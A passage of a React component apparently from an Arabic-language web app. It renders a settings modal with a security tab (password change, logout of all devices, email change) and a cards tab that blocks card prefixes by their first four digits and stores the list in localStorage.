                  boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8)",
                }}
              >
                {renderStaticBoxes()}
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Settings Modal */}
      {showSettingsModal && (
        <div 
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            direction: "rtl",
          }}
          onClick={(e) => { if (e.target === e.currentTarget) setShowSettingsModal(false); }}
        >
          <div 
            ref={settingsModalRef}
            style={{
              background: "#fff",
              borderRadius: 16,
              width: settingsTab === "archive" ? "95vw" : 500,
              maxWidth: "95vw",
              maxHeight: "90vh",
              overflow: "hidden",
              display: "flex",
              flexDirection: "column",
              boxShadow: "0 20px 50px rgba(0,0,0,0.2)",
            }}
          >
            {/* Header */}
            <div style={{ padding: "16px 20px", borderBottom: "1px solid #e5e7eb", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 700, color: "#111827" }}>الإعدادات</h2>
              <button 
                onClick={() => setShowSettingsModal(false)}
                style={{ border: "none", background: "none", cursor: "pointer", padding: 4, color: "#6b7280" }}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <line x1="18" y1="6" x2="6" y2="18"/>
                  <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
              </button>
            </div>

            {/* Tabs */}
            <div style={{ display: "flex", borderBottom: "1px solid #e5e7eb", background: "#f9fafb" }}>
              {[
                { key: "security", label: "الأمان" },
                { key: "cards", label: "البطاقات" },
              ].map((tab) => (
                <button
                  key={tab.key}
                  onClick={() => setSettingsTab(tab.key as any)}
                  style={{
                    flex: 1,
                    padding: "12px",
                    border: "none",
                    background: settingsTab === tab.key ? "#fff" : "transparent",
                    color: settingsTab === tab.key ? "#2563eb" : "#6b7280",
                    fontWeight: settingsTab === tab.key ? 700 : 500,
                    cursor: "pointer",
                    borderBottom: settingsTab === tab.key ? "2px solid #2563eb" : "2px solid transparent",
                    transition: "all 0.2s",
                  }}
                >
                  {tab.label}
                </button>
              ))}
            </div>

            {/* Content */}
            <div style={{ padding: 20, overflowY: "auto", flex: 1 }}>
              {/* Security Tab */}
              {settingsTab === "security" && (
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                  {/* Change Password */}
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>تغيير كلمة المرور</h3>
                    <input 
                      type="password" 
                      placeholder="كلمة المرور الجديدة"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <input 
                      type="password" 
                      placeholder="تأكيد كلمة المرور"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <button style={{ padding: "10px 20px", background: "#2563eb", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تحديث كلمة المرور
                    </button>
                  </div>

                  {/* Logout All Devices */}
                  <div style={{ background: "#fef2f2", borderRadius: 12, padding: 16, border: "1px solid #fecaca" }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#991b1b" }}>تسجيل خروج جميع الأجهزة</h3>
                    <p style={{ margin: "0 0 12px 0", fontSize: "0.85rem", color: "#6b7280" }}>سيتم تسجيل خروجك من جميع الأجهزة المتصلة</p>
                    <button style={{ padding: "10px 20px", background: "#dc2626", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تسجيل خروج جميع الأجهزة
                    </button>
                  </div>

                  {/* Change Email */}
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>تغيير البريد الإلكتروني</h3>
                    <input 
                      type="email" 
                      placeholder="البريد الإلكتروني الجديد"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <button style={{ padding: "10px 20px", background: "#2563eb", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تحديث البريد الإلكتروني
                    </button>
                  </div>
                </div>
              )}

              {/* Cards Tab */}
              {settingsTab === "cards" && (
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>حظر البطاقات</h3>
                    <p style={{ margin: "0 0 12px 0", fontSize: "0.85rem", color: "#6b7280" }}>أدخل أول 4 أرقام من البطاقة لحظرها</p>
                    <div style={{ display: "flex", gap: 8 }}>
                      <input 
                        type="text"
                        maxLength={4}
                        placeholder="0000"
                        value={newBlockedCard}
                        onChange={(e) => setNewBlockedCard(e.target.value.replace(/\D/g, ""))}
                        style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "1rem", textAlign: "center", fontFamily: "monospace" }}
                      />
                      <button 
                        onClick={() => {
                          if (newBlockedCard.length === 4 && !blockedCards.includes(newBlockedCard)) {
                            const updated = [...blockedCards, newBlockedCard];
                            setBlockedCards(updated);
                            localStorage.setItem("blockedCards", JSON.stringify(updated));
                            setNewBlockedCard("");
                            showNotification("success", "تم حظر البطاقة بنجاح");
                          }
                        }}
                        disabled={newBlockedCard.length !== 4}
                        style={{ padding: "10px 20px", background: newBlockedCard.length === 4 ? "#dc2626" : "#d1d5db", color: "#fff", border: "none", borderRadius: 8, cursor: newBlockedCard.length === 4 ? "pointer" : "not-allowed", fontWeight: 600 }}
                      >
                        حجب
                      </button>
                    </div>
                  </div>

                  {/* Blocked Cards List */}
                  {blockedCards.length > 0 && (
                    <div style={{ background: "#fef2f2", borderRadius: 12, padding: 16, border: "1px solid #fecaca" }}>
                      <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#991b1b" }}>البطاقات المحجوبة ({blockedCards.length})</h3>
                      <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                        {blockedCards.map((card) => (
                          <div key={card} style={{ display: "flex", alignItems: "center", gap: 8, background: "#fff", padding: "8px 12px", borderRadius: 8, border: "1px solid #fecaca" }}>
                            <span style={{ fontFamily: "monospace", fontWeight: 700, color: "#dc2626" }}>{card}</span>
                            <button 
                              onClick={() => {
                                const updated = blockedCards.filter(c => c !== card);
                                setBlockedCards(updated);
                                localStorage.setItem("blockedCards", JSON.stringify(updated));
                              }}
                              style={{ border: "none", background: "#fee2e2", color: "#dc2626", cursor: "pointer", padding: "2px 6px", borderRadius: 4, fontSize: "0.75rem" }}
                            >
                              إلغاء
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
